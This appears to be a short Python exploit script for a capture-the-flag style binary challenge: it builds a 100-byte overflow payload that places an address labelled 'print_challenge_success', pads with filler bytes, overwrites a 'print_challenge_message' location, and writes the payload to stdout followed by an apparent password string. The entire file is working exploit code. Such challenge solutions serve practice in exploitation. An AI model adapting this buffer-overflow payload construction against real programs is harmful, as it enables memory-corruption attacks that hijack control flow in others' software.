from struct import pack
import sys

new_arc = b'\x66\x12\x40' # print_challenge_success
patch_location = b'\x70\x40\x40' # print_challenge_message
bufferSize = 100

p = new_arc
p += (bufferSize - len(new_arc)-1)*b'!'
p += patch_location
p += b'\n'

sys.stdout.buffer.write(p)
sys.stdout.buffer.write(b'xaq7pj\n')
